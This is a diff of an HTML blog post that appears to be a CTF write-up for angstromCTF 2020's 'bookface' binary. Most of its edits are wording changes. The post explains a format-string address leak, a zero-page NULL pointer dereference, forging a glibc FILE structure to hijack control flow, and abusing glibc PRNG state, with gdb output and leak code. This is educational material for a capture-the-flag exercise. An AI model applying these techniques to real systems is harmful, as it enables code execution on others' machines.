@@ -65,11 +65,11 @@
 &lt;li&gt;Leak Libc address using Format String Attack.&lt;/li&gt;
 &lt;li&gt;Abusing &lt;em&gt;glibc PRNG&lt;/em&gt; by overwrite the random state using &lt;em&gt;friends&lt;/em&gt; pointer.&lt;/li&gt;
 &lt;li&gt;Writing a forged &lt;em&gt;FILE&lt;/em&gt; structure in &lt;em&gt;Zero Page&lt;/em&gt;.&lt;/li&gt;
-&lt;li&gt;Trigger &lt;em&gt;FILE&lt;/em&gt; structure exploit by a &lt;em&gt;NULL Pointer Dereference Attack&lt;/em&gt; and a &lt;em&gt;TOCTOU&lt;/em&gt; bug.&lt;/li&gt;
+&lt;li&gt;Trigger &lt;em&gt;FILE&lt;/em&gt; structure exploit by a &lt;em&gt;NULL Pointer Dereference Attack&lt;/em&gt; and exploiting a &lt;em&gt;TOCTOU&lt;/em&gt; bug.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;As usually in binary exploitation binaries are related to libc, most of the time we need the libc to exploit the binary (calling system function, overwriting malloc or free hooks, using one_gadget, &amp;hellip;), so it&amp;rsquo;s better to start debugging using the remote libc locally, there are many ways to achieve that.&lt;/p&gt;
-&lt;p&gt;We can easily build an identical docker image same as the remote challenge image using these files, but if you want to debug the binary inside a container you should install your favorite tools (gdb with peda, pwndbg or gef extension) inside the container.&lt;/p&gt;
-&lt;p&gt;The easy way that I prefer is patching the binary and modify the &lt;em&gt;RUNPATH&lt;/em&gt; to point to the directory where the target libc is located, this technique is explained in &lt;a href=&#34;https://www.ayrx.me/about&#34; target=&#34;_blank&#34;&gt;@Ayrx&lt;/a&gt; blog post &lt;strong&gt;&amp;ldquo;Using a non-system glibc&amp;rdquo;&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;p&gt;As usually in binary exploitation, binaries are related to &lt;em&gt;libc&lt;/em&gt;, most of the time we need the libc to exploit the binary (calling &lt;em&gt;system&lt;/em&gt; function, overwriting (malloc) or &lt;em&gt;free&lt;/em&gt; hooks, using &lt;em&gt;one_gadget&lt;/em&gt;, &amp;hellip;), so it&amp;rsquo;s better to start debugging using the remote libc locally, there are many ways to achieve that.&lt;/p&gt;
+&lt;p&gt;We can easily build an identical docker image to the remote challenge image using these files, but if you want to debug the binary inside a container you need to install your favorite tools (gdb with peda, pwndbg or gef extension) inside the container.&lt;/p&gt;
+&lt;p&gt;The easy way that I prefer is patching the binary and modifying the &lt;em&gt;RUNPATH&lt;/em&gt; to point to the directory where the target libc is located, this technique is explained in &lt;a href=&#34;https://www.ayrx.me/about&#34; target=&#34;_blank&#34;&gt;@Ayrx&lt;/a&gt; blog post &lt;strong&gt;&amp;ldquo;Using a non-system glibc&amp;rdquo;&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ mv bookface backup
 $ python change_glibc.py backup libc.so.6 ld-2.23.so bookface
 Current ld.so:
@@ -90,23 +90,23 @@ linux-vdso.so.1 (0x00007ffe1bbe7000)
 libc.so.6 =&amp;gt; /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 (0x00007ff062cb8000)
 /home/philomath213/Documents/CTFs/angstromctf2020/bookface/ld-2.23.so =&amp;gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007ff0630ae000)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; you can get ld-2.23.so file from the ubuntu:xenial image&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;N.B.&lt;/strong&gt; You can get &lt;em&gt;ld-2.23.so&lt;/em&gt; file from the &lt;em&gt;ubuntu:xenial&lt;/em&gt; image.&lt;/p&gt;
 &lt;p&gt;Now we can run the binary locally with the same libc used remotely.&lt;/p&gt;
 &lt;h2 id=&#34;source-code-analysis&#34;&gt;Source Code Analysis&lt;/h2&gt;
-&lt;p&gt;Since the source code is available we don&amp;rsquo;t have to reverse engineering the binary, just read the code.&lt;/p&gt;
-&lt;p&gt;For global variables we have &lt;code&gt;user&lt;/code&gt; a profile structure pointer and &lt;code&gt;uid&lt;/code&gt; and integer data type.&lt;/p&gt;
+&lt;p&gt;Since the source code is available, we don&amp;rsquo;t have to reverse engineering the binary, just read the code.&lt;/p&gt;
+&lt;p&gt;For global variables we have &lt;code&gt;user&lt;/code&gt; a profile structure pointer and &lt;code&gt;uid&lt;/code&gt; an integer.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct profile *user;
 int uid;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The profile structure has two fields: &lt;code&gt;name&lt;/code&gt; a &lt;code&gt;char&lt;/code&gt; array with 0x100 length and &lt;code&gt;friends&lt;/code&gt; a &lt;code&gt;long long&lt;/code&gt; pointer (I repeat it&amp;rsquo;s a pointer not just long long data type).&lt;/p&gt;
+&lt;p&gt;The profile structure has two fields: a &lt;em&gt;char array&lt;/em&gt; (&lt;code&gt;name&lt;/code&gt;) of size &lt;em&gt;0x100&lt;/em&gt; and a pointer to a &lt;em&gt;long long&lt;/em&gt; (&lt;code&gt;friends&lt;/code&gt;).&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct profile {
 char name[0x100];
 long long *friends; // some people have a lot of friends
 };
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;This program first call &lt;code&gt;srand&lt;/code&gt; to set &lt;code&gt;time(NULL)&lt;/code&gt; as seed for a new sequence of pseudo-random integers to be returned by &lt;code&gt;rand()&lt;/code&gt; we will get back to this later in the writeup.&lt;/p&gt;
-&lt;p&gt;Then it calls &lt;code&gt;login()&lt;/code&gt;, &lt;code&gt;login&lt;/code&gt; function basically asks for user id and create a file with user id as file name under &lt;code&gt;users&lt;/code&gt; directory.&lt;/p&gt;
-&lt;p&gt;If the file doesn&amp;rsquo;t exist, the program will call &lt;code&gt;mmap&lt;/code&gt;, this will basically allocate a memory at a random address, size equals to size of &lt;code&gt;profile&lt;/code&gt; structure and &lt;em&gt;READ&lt;/em&gt; and &lt;em&gt;WRITE&lt;/em&gt; memory flags. Then read 0x100 bytes into it using &lt;code&gt;fgets&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Then it calls &lt;code&gt;login()&lt;/code&gt;, the &lt;code&gt;login&lt;/code&gt; function basically asks for userid and creates a file with userid as a file name under &lt;code&gt;users&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;If the file doesn&amp;rsquo;t exist, the program will call &lt;code&gt;mmap&lt;/code&gt;, this will basically allocates a memory at a random address, witg a size equals to size of &lt;code&gt;profile&lt;/code&gt; structure, the protections are &lt;em&gt;PROT_READ | PROT_WRITE&lt;/em&gt;. Then it reads &lt;em&gt;0x100&lt;/em&gt; bytes into it using &lt;code&gt;fgets&lt;/code&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;puts(&amp;quot;Welcome to bookface!&amp;quot;);
 user = mmap(rand() &amp;amp; 0xfffffffffffff000, sizeof(struct profile),
 PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
@@ -129,7 +129,7 @@ printf(&amp;quot;Support: &amp;quot;);
 n += read(1, survey + n, 3);
 survey[n] = 0;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The program check if there any &lt;code&gt;&#39;n&#39;&lt;/code&gt; letter in inputs, if so the program will exist.&lt;/p&gt;
+&lt;p&gt;The program check if there is any &lt;code&gt;&#39;n&#39;&lt;/code&gt; letter in the inputs, if so the program will exit.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (strchr(survey, &#39;n&#39;) != NULL) {
 // a bug bounty report said something about hacking and the letter n
 puts(&amp;quot;ERROR: HACKING DETECTED&amp;quot;);
@@ -137,8 +137,8 @@ puts(&amp;quot;Exiting...&amp;quot;);
 exit(1);
 }
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This would prevent users from doing arbitrary write using &lt;strong&gt;Format String Attack&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:12&#34;&gt;&lt;a href=&#34;#fn:12&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;, if there any vulnerability like that.&lt;/p&gt;
-&lt;p&gt;If the survey rates were different then 10, 10, 10, 10&lt;/p&gt;
+&lt;p&gt;This would prevent users from doing arbitrary write using &lt;strong&gt;Format String Attack&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:using-the-common-n-specifier&#34;&gt;&lt;a href=&#34;#fn:using-the-common-n-specifier&#34;&gt;0&lt;/a&gt;&lt;/sup&gt;, if there is any vulnerability like that.&lt;/p&gt;
+&lt;p&gt;If the survey rates are different than &lt;em&gt;10, 10, 10, 10&lt;/em&gt;, we notice the format string bug!.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (strcmp(survey, &amp;quot;10\n10\n10\n10\n&amp;quot;) != 0) {
 puts(
 &amp;quot;Those ratings don&#39;t seem quite right. Please review them and try &amp;quot;
@@ -156,7 +156,7 @@ n += read(1, survey + n, 3);
 survey[n] = 0;
 }
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Notice that the program will call &lt;code&gt;printf&lt;/code&gt; with user input &lt;code&gt;survey&lt;/code&gt; directly as format string &lt;code&gt;printf(survey)&lt;/code&gt;, so we have Format String Bug here.&lt;/p&gt;
+&lt;p&gt;The program will call &lt;code&gt;printf&lt;/code&gt; with user input &lt;code&gt;survey&lt;/code&gt; directly as a format string &lt;code&gt;printf(survey)&lt;/code&gt;, so we have Format String Bug here.&lt;/p&gt;
 &lt;p&gt;Then it opens the file and reads its content into an allocated memory via &lt;code&gt;mmap&lt;/code&gt; the same way as mentioned above.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;user = mmap(rand() &amp;amp; 0xfffffffffffff000, sizeof(struct profile),
 PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
@@ -165,7 +165,7 @@ FILE *f = fopen(file, &amp;quot;rb&amp;quot;);
 fread(user, 1, sizeof(struct profile), f);
 fclose(f);
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;At the end it checks if the survey rates were different then 10, 10, 10, 10, it will set friends number to 0.&lt;/p&gt;
+&lt;p&gt;At the end it checks if the survey rates were different then &lt;em&gt;10, 10, 10, 10&lt;/em&gt;, it will set friends number to &lt;em&gt;0&lt;/em&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (strcmp(survey, &amp;quot;10\n10\n10\n10\n&amp;quot;) != 0) {
 puts(
 &amp;quot;Our survey says... you don&#39;t seem very nice. I doubt you have any &amp;quot;
@@ -173,7 +173,7 @@ puts(
 *(user-&amp;gt;friends) = 0;
 }
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;That&amp;rsquo;s all what login function do, in the other hand the &lt;code&gt;main&lt;/code&gt; function is just menu driven while loop to choose between:&lt;/p&gt;
+&lt;p&gt;That&amp;rsquo;s all what login function does, in the other hand the &lt;code&gt;main&lt;/code&gt; function is just menu-driven while loop to choose between:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://philomath213.github.io/post/AngstromCTF2020-bookface/screenshot0.png&#34; alt=&#34;screenshot0&#34; /&gt;&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;&lt;p&gt;&lt;em&gt;incrementing friends number&lt;/em&gt;&lt;/p&gt;
@@ -200,7 +200,7 @@ sprintf(file, &amp;quot;users/%d&amp;quot;, uid);
 remove(file);
 login();
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This will remove the file corresponding user id, the call &lt;code&gt;login&lt;/code&gt; function again.&lt;/p&gt;&lt;/li&gt;
+&lt;p&gt;This will remove the file corresponding to userid, the call &lt;code&gt;login&lt;/code&gt; function again.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;&lt;em&gt;login off&lt;/em&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;puts(&amp;quot;Logging out...\n&amp;quot;);
 sprintf(file, &amp;quot;users/%d&amp;quot;, uid);
@@ -209,7 +209,7 @@ fwrite(user, 1, sizeof(struct profile), f);
 fclose(f);
 login();
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This will write the content pointed by user to the file corresponding to user id and call &lt;code&gt;login&lt;/code&gt; again.&lt;/p&gt;&lt;/li&gt;
+&lt;p&gt;This will write the content pointed by &lt;code&gt;user&lt;/code&gt; to the file corresponding to userid, and then will call &lt;code&gt;login&lt;/code&gt; again.&lt;/p&gt;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Let&amp;rsquo;s get back to &lt;code&gt;login&lt;/code&gt; function, at the end if the survey rates were different then &lt;em&gt;10, 10, 10, 10&lt;/em&gt; the program do this instruction &lt;code&gt;*(user-&amp;gt;friends) = 0&lt;/code&gt; which will dereference the &lt;code&gt;friends&lt;/code&gt; &lt;code&gt;long long*&lt;/code&gt; pointer and set its content to 0 (i.e. write 8 NULL bytes where &lt;code&gt;friends&lt;/code&gt; is pointing), it means we have arbitrary 8 NULL bytes write.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Another remark:&lt;/strong&gt; The program lacks errors checking, overall there are no error checking when dealing with files (&lt;code&gt;fopen&lt;/code&gt;, &lt;code&gt;fclose&lt;/code&gt;, &lt;code&gt;fread&lt;/code&gt;).&lt;/p&gt;
@@ -224,32 +224,32 @@ login();
 &lt;p&gt;Note that the 1st line of Dockerfile contains a comment:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#IMPORTANT: on host system: sysctl vm.mmap_min_addr=0
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;What does it means?&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;mmap_min_addr&lt;/code&gt; is a kernel tunable that specifies the minimum virtual address that a process is allowed to mmap&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;, Allowing processes to map low values expose the system to &amp;ldquo;Kernel NULL pointer dereference&amp;rdquo; attacks&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
-&lt;p&gt;It was introduced to Linux Kernel as mitigation against Null Pointer Dereference Attack, but in our case it&amp;rsquo;s disabled since mmap_min_addr=0.&lt;/p&gt;
-&lt;p&gt;You can check the current value in your locally machine at &lt;code&gt;/proc/sys/vm/mmap_min_addr&lt;/code&gt; (Arch linux, for other distributions maybe at a different location)&lt;/p&gt;
+&lt;p&gt;What does it mean?&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;mmap_min_addr&lt;/code&gt; is a kernel tunable that specifies the minimum virtual address that a process is allowed to mmap&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;, Allowing processes to map low values expose the system to &amp;ldquo;Kernel NULL pointer dereference&amp;rdquo; attacks&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;p&gt;It was introduced to Linux Kernel as mitigation against Null Pointer Dereference Attacks, but in our case it&amp;rsquo;s disabled since &lt;em&gt;mmap_min_addr=0&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;You can check the current value in your local machine at &lt;code&gt;/proc/sys/vm/mmap_min_addr&lt;/code&gt; (Arch linux, for other distributions maybe at a different location)&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ cat /proc/sys/vm/mmap_min_addr
 65536
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The default value in Arch Linux is &lt;code&gt;65536&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This a Kernel feature like ASLR, and Linux containers share the same kernel with the host machine.&lt;/p&gt;
-&lt;p&gt;If you are familiar with Linux Kernel Exploitation you probably know how NULL pointer dereference happens, most of the time is due lack of error checking.&lt;/p&gt;
+&lt;p&gt;The default value in Arch Linux is &lt;em&gt;65536&lt;/em&gt; (&lt;em&gt;0x10000&lt;/em&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;N.B.&lt;/strong&gt; This a Kernel feature like ASLR, and Linux containers share the same kernel with the host machine.&lt;/p&gt;
+&lt;p&gt;If you are familiar with Linux Kernel Exploitation you probably know how NULL pointer dereference happens, most of the time is due to the lack of error checking.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;FILE *f = fopen(file, &amp;quot;rb&amp;quot;);
 fread(user, 1, sizeof(struct profile), f);
 fclose(f);
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Upon successful completion &lt;code&gt;fopen&lt;/code&gt; returns a &lt;code&gt;FILE&lt;/code&gt; pointer Otherwise, &lt;code&gt;NULL&lt;/code&gt; is returned.&lt;/p&gt;
 &lt;p&gt;NULL is just a zero value, NULL pointer is 8 (or 4 in 32 bits machine) null bytes (i.e. 0x0000000000000000 or 0x00000000 in 32 bits machine).&lt;/p&gt;
-&lt;p&gt;what will happen if &lt;code&gt;fopen&lt;/code&gt; fails? basically the following:&lt;/p&gt;
+&lt;p&gt;What will happen if &lt;code&gt;fopen&lt;/code&gt; fails? basically the following:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;fread(user, 1, sizeof(struct profile), (FILE *)0);
 fclose((FILE *)0);
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;fread&lt;/code&gt; and &lt;code&gt;fclose&lt;/code&gt; will dereference the &lt;code&gt;f&lt;/code&gt; FILE pointer (&lt;code&gt;f&lt;/code&gt; will points to 0x0000000000000000 memory location).&lt;/p&gt;
-&lt;p&gt;So if we can map (allocate) memory at the &lt;code&gt;0x0000000000000000&lt;/code&gt; address and write a forged FILE structure there.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;fread&lt;/code&gt; and &lt;code&gt;fclose&lt;/code&gt; will dereference the &lt;code&gt;f&lt;/code&gt; &lt;em&gt;FILE&lt;/em&gt; pointer (&lt;code&gt;f&lt;/code&gt; will points to &lt;em&gt;0x0000000000000000&lt;/em&gt; memory address).&lt;/p&gt;
+&lt;p&gt;So if we can map (allocate) memory at the &lt;em&gt;0x0000000000000000&lt;/em&gt; address (&lt;em&gt;Zero Page&lt;/em&gt;) and write a forged FILE structure there.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;fread&lt;/code&gt; and &lt;code&gt;fclose&lt;/code&gt; will simply consider it as valid FILE structure.&lt;/p&gt;
 &lt;p&gt;The question is therefore: How can this helps us achieve code execution?&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://gsec.hitb.org/sg2018/speakers/an-jie-yang-angelboy/&#34; target=&#34;_blank&#34;&gt;@Angelboy&lt;/a&gt; in his paper &lt;strong&gt;FILE Structures: Another Binary Exploitation Technique&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:4&#34;&gt;&lt;a href=&#34;#fn:4&#34;&gt;5&lt;/a&gt;&lt;/sup&gt;, presented at HITB GSEC 2018 Conference proposed a new attack technique that exploits the FILE structure in GNU C Library (glibc) to gain control over execution flow (RIP), this technique won&amp;rsquo;t only get RIP control, but also control over RDI, RSI and RDX.&lt;/p&gt;
-&lt;p&gt;The attack is illustrated in &lt;a href=&#34;https://dhavalkapil.com/about/&#34; target=&#34;_blank&#34;&gt;@Dhaval Kapil&lt;/a&gt; blog post &lt;strong&gt;FILE Structure Exploitation (&amp;lsquo;vtable&amp;rsquo; check bypass)&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34;&gt;6&lt;/a&gt;&lt;/sup&gt;, calls &lt;code&gt;fclose&lt;/code&gt; with a forged FILE structure, This structure contains &lt;code&gt;vtable&lt;/code&gt;, which is a pointer to a table contains functions that will be called when the original &lt;code&gt;FILE&lt;/code&gt; pointer is used to perform different operations (e.g. &lt;code&gt;fclose&lt;/code&gt;, &lt;code&gt;fread&lt;/code&gt;, &lt;code&gt;fwrite&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://gsec.hitb.org/sg2018/speakers/an-jie-yang-angelboy/&#34; target=&#34;_blank&#34;&gt;@Angelboy&lt;/a&gt; in his paper &lt;strong&gt;FILE Structures: Another Binary Exploitation Technique&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:4&#34;&gt;&lt;a href=&#34;#fn:4&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;, presented at HITB GSEC 2018 Conference proposed a new attack technique that exploits the &lt;em&gt;FILE&lt;/em&gt; structure in GNU C Library (&lt;em&gt;glibc&lt;/em&gt;) to gain control over execution flow (&lt;em&gt;RIP&lt;/em&gt;), this technique won&amp;rsquo;t only get &lt;em&gt;RIP&lt;/em&gt; control, but also control over &lt;em&gt;RDI&lt;/em&gt;, &lt;em&gt;RSI&lt;/em&gt; and &lt;em&gt;RDX&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;The attack is illustrated in &lt;a href=&#34;https://dhavalkapil.com/about/&#34; target=&#34;_blank&#34;&gt;@Dhaval Kapil&lt;/a&gt; blog post &lt;strong&gt;FILE Structure Exploitation (&amp;lsquo;vtable&amp;rsquo; check bypass)&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34;&gt;5&lt;/a&gt;&lt;/sup&gt;, it calls &lt;code&gt;fclose&lt;/code&gt; with a forged FILE structure, this structure contains &lt;code&gt;vtable&lt;/code&gt;, which is a pointer to a table contains functions that will be called when the original &lt;code&gt;FILE&lt;/code&gt; pointer is used to perform different operations (e.g. &lt;code&gt;fclose&lt;/code&gt;, &lt;code&gt;fread&lt;/code&gt;, &lt;code&gt;fwrite&lt;/code&gt;).&lt;/p&gt;
 &lt;p&gt;So what we need right now is:
 1. Make &lt;code&gt;mmap&lt;/code&gt; maps a memory page at address &lt;em&gt;0x0000000000000000&lt;/em&gt;.
 2. Forge a malicious FILE structure at &lt;em&gt;0x0000000000000000&lt;/em&gt;.
@@ -263,9 +263,9 @@ Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;We need to leak some address to bypass &lt;code&gt;PIE&lt;/code&gt; and &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We need to leak some addresses to bypass &lt;code&gt;PIE&lt;/code&gt; and &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;We&amp;rsquo;ll use Format String Attack to get leak to address in the stack, to get to that we need to provide a userid then logout and use the same userid.&lt;/p&gt;
-&lt;p&gt;We&amp;rsquo;ll set a breakpoint at &lt;code&gt;*login+501&lt;/code&gt; where the program calls &lt;code&gt;printf(survey)&lt;/code&gt; and observe what&amp;rsquo;s in the stack at exact moment.&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;ll set a breakpoint at &lt;code&gt;*login+501&lt;/code&gt; where the program calls &lt;code&gt;printf(survey)&lt;/code&gt; and observe what&amp;rsquo;s in the stack at that point.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ gdb-gef bookface
 ...
 gef&amp;gt; break *login+820
@@ -331,7 +331,7 @@ gef➤ telescope 32
 0x00007fffffffdf60│+0x00f0: 0x0000000000000001
 0x00007fffffffdf68│+0x00f8: 0x00007fffffffe038 → 0x00007fffffffe332 → &amp;quot;/home/philomath213/Documents/CTFs/angstromctf2020/[...]&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The login function stack frame is located at &lt;em&gt;0x7fffffffdef0&lt;/em&gt; (&lt;em&gt;$rsp+0x0090&lt;/em&gt;), and the saved return address is locate at &lt;em&gt;0x7fffffffdee8&lt;/em&gt; (&lt;em&gt;$rsp+0x0078&lt;/em&gt;) this pointer will give us the binary base where it&amp;rsquo;s loaded, there another interesting pointer at &lt;em&gt;0x00007fffffffdf58&lt;/em&gt; (&lt;em&gt;$rsp+0x00e8&lt;/em&gt;) a libc pointer, it will give us libc base address.&lt;/p&gt;
+&lt;p&gt;The login function stack frame is located at &lt;em&gt;0x7fffffffdef0&lt;/em&gt; (&lt;em&gt;$rsp+0x0090&lt;/em&gt;), and the saved return address is located at &lt;em&gt;0x7fffffffdee8&lt;/em&gt; (&lt;em&gt;$rsp+0x0078&lt;/em&gt;) this pointer will give us the binary base where it&amp;rsquo;s loaded, there is another interesting pointer at &lt;em&gt;0x00007fffffffdf58&lt;/em&gt; (&lt;em&gt;$rsp+0x00e8&lt;/em&gt;) a libc pointer, it will give us libc base address.&lt;/p&gt;
 &lt;p&gt;The format string offset for the 1st pointer will be &lt;em&gt;21&lt;/em&gt; (&lt;code&gt;%21$p&lt;/code&gt;) while the 2nd will be &lt;em&gt;35&lt;/em&gt; (&lt;code&gt;%35$p&lt;/code&gt;).&lt;/p&gt;
 &lt;p&gt;In order to calculate the base address from these two pointers we need precalculate the offsets.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gef&amp;gt; vmmap
@@ -371,7 +371,7 @@ libc_base = leak - libc_offset
 log.info(&amp;quot;libc_base: 0x{:016x}&amp;quot;.format(libc_base))
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h4 id=&#34;zero-page&#34;&gt;Zero Page&lt;/h4&gt;
-&lt;p&gt;We need to write the forged &lt;em&gt;FILE&lt;/em&gt; structure into the &lt;em&gt;Zero Page&lt;/em&gt; (i.e. memory page at &lt;em&gt;0x0000000000000000&lt;/em&gt;), when login with new user id the following instruction will be executed&lt;/p&gt;
+&lt;p&gt;We need to write the forged &lt;em&gt;FILE&lt;/em&gt; structure into the &lt;em&gt;Zero Page&lt;/em&gt; (i.e. memory page at &lt;em&gt;0x0000000000000000&lt;/em&gt;), when login with a new userid the following instruction will be executed:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;puts(&amp;quot;Welcome to bookface!&amp;quot;);
 user = mmap(rand()&amp;amp;0xfffffffffffff000, sizeof (struct profile), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
 printf(&amp;quot;What&#39;s your name? &amp;quot;);
@@ -379,10 +379,10 @@ fgets(user-&amp;gt;name, 0x100, stdin);
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;code&gt;mmap&lt;/code&gt; will map a page at &lt;code&gt;rand() &amp;amp; 0xfffffffffffff000&lt;/code&gt;, there are two ways (maybe more) to make that value be zero:&lt;/p&gt;
 &lt;h4 id=&#34;1-easy-dirty-way-brutforce&#34;&gt;1. Easy dirty way &amp;ldquo;Brutforce&amp;rdquo;:&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;rand()&lt;/code&gt; (see &lt;code&gt;man 3 rand&lt;/code&gt;) will return a pseudo-random integer in range &lt;code&gt;[0, RAND_MAX]&lt;/code&gt;, &lt;code&gt;RAND_MAX&lt;/code&gt; dependent on the implementation, but it&amp;rsquo;s guaranteed that this value is at least &lt;em&gt;32767&lt;/em&gt; (&lt;em&gt;0x7fff&lt;/em&gt;)&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:6&#34;&gt;&lt;a href=&#34;#fn:6&#34;&gt;7&lt;/a&gt;&lt;/sup&gt;. there is a chance that &lt;code&gt;rand()&lt;/code&gt; will return a integer less than &lt;em&gt;0x1000&lt;/em&gt;.&lt;/p&gt;
-&lt;h4 id=&#34;2-hard-effecient-way-abusing-glibc-prng&#34;&gt;2. Hard effecient way &amp;ldquo;Abusing glibc PRNG&amp;rdquo;:&lt;/h4&gt;
-&lt;p&gt;&lt;em&gt;glibc&lt;/em&gt; pseudo-random-number-generator (&lt;em&gt;PRNG&lt;/em&gt;)&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7&#34;&gt;&lt;a href=&#34;#fn:7&#34;&gt;8&lt;/a&gt;&lt;/sup&gt; like any &lt;em&gt;PRNG&lt;/em&gt; generates a sequence of random numbers, this sequence is not truly random, because it is determined by the &lt;em&gt;PRNG&lt;/em&gt;&amp;rsquo;s state which is initially the seed value set by &lt;code&gt;srand&lt;/code&gt;, in our case it is &lt;code&gt;time(NULL)&lt;/code&gt;, &lt;em&gt;glibc PRNG&lt;/em&gt; (see &lt;code&gt;man 3 rand&lt;/code&gt;) use hidden state that is modified on each call, this hidden state is probably located at writable memory in libc address space.&lt;/p&gt;
